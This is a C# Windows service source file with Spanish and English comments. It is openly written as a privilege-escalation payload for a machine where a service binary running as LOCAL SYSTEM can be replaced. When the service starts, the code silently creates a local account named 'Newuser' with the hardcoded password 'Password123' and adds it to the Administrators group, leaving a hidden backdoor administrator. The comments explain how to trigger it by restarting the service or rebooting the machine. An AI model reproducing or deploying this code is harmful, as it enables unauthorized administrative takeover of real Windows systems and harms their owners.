using System;
using System.DirectoryServices.AccountManagement;
using System.Security.Principal;
using System.ServiceProcess;
using System.IO;

/*
Codigo simpe para ser usado cuando se puede reemplazar el binario de un servicio en un sistema. El servicio candidato debe ejecutarse con LOCAL SYSTEM o con un usuario que tenga priviliegios administrativos locales.
Tomar en cuenta que el servicio debe ser reiniciado para que los cambios se apliquen. Si no se tienen permisos para restartear el servicio y el mismo inicia de forma automatica, se puede reiniciar el equipo
Dependiendo del lenguaje del S.O. será necesario modificar la variable "group":
Ingles: "Administrators"
Español: "Administradores"
Pero... se puede agregar al usuario al grupo de nuestra elección


Simple code to be used when you can replace service binary in a system. The service candidate must be running with LOCAL SYSTEM or with a user with local Admin privileges.
Take into account that the service must be restarted to impact the changes. If you don´t have permisssion to restart the service and service starts atumoatically, you can restart the system.

Dpending on the S.O. language you need to change the "group" variable:
English: "Administrators"
Spanish: "Administradores"
But... you can add the user to the group of your choice.
*/
namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        // Inicializo el path de logging
        private string logFilePath = "C:\\Temp\\LogFile.txt"; // Specify the path to your log file.
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            // Capturo la identidad actual del proceso
            // Capture actual proccess identity
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            // Inicializo los parametros de nombre de usuario, contraseña y grupo donde incorporarlo
            // Initialize parameters for username, password and group to be added
            string username = "Newuser";
            string password = "Password123";
            string group = "Administradores";

            // Verifico si el proceso esta ejecutandose con privilegios administrativos
            // Verify if the process is running with admin privileges
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                // El servicio se ejecuta con privilegios administrativos
                // The service is running with administrative privileges
                Log("Service is running with administrative privileges.");

                // Intento crear el usuario y agregarlo al grupo especificado
                // Tries to create the user and add it to the specified group
                try
                {
                    // Parametros: NombreUsuario, Contraseña
                    // Parameters: Username, Password
                    UserPrincipal user = CreateUser(username, password);
                    // Parametros: Objeto Usuario y grupo a ser agregado
                    // Parameters: Usuer object and group to be added
                    AddToGroup(user, group);

                    Log("User created and added to group successfully.");

                }
                catch (Exception ex)
                {
                    // Algo anduvo mal en la creación. Genero log
                    // Something went wrong. Log generation
                    Log("Error creating user and adding to Administrators group: " + ex.Message);
                }

            }
            else
            {
                 // El servicio no se esta ejecutando con privilegios administrativos
                // The service is not running with administrative privileges
                Log("Service is NOT running with administrative privileges.");
            }
            
        }


        protected override void OnStop()
        {
            // place holder for logic
        }

        private UserPrincipal CreateUser(string username, string password)
        {
            // El usuario se creará a nivel local
            // User will be created in the local machine
            using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
            {
                // Creo el objeto user (clase UserPrincipal) para poblar sus atributos
                // Creates user object (UserPrincipal class) to populate attributes
                UserPrincipal user = new UserPrincipal(context);
                user.SamAccountName = username;
                user.SetPassword(password);
                user.Enabled = true;
                // Impacta el usuario en el equipo local
                // Impact the user in the local computer
                user.Save();
                return user;
            }
        }

        private void AddToGroup(UserPrincipal user, string group)
        {
            // El grupo donde incorporaremos al usuario es local
            // The group where user will be added is local
            PrincipalContext context = new PrincipalContext(ContextType.Machine);
            // Busco el nombre de grupo en el equipo local
            // Find the group by name in the local machine
            GroupPrincipal groupToAdd = GroupPrincipal.FindByIdentity(context, group);
            if (groupToAdd != null)
            {
                // Agrega al usuario al grupo local
                // Adds the user to de local group
                groupToAdd.Members.Add(user);
                // Impacta el cambio
                // Apply changes
                groupToAdd.Save();
            }
        }
        private void Log(string message)
        {
            try
            {
                // Agrega el mensaje al archivo de log
                // Append the log message to the log file
                using (StreamWriter writer = new StreamWriter(logFilePath, true))
                {
                    writer.WriteLine(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " - " + message);
                }
            }
            catch (Exception ex)
            {
                // Maneja errores que pudieran ocurrir durante el loggint (ej: el archivo de log no se encuentra o permisos). Poco util dado que no es interactivo
                // Handle any errors that occur during logging (e.g., file not found, permissions). A little useless because service is not interactive
                Console.WriteLine("Error writing to log file: " + ex.Message);
            }
        }
    }
}
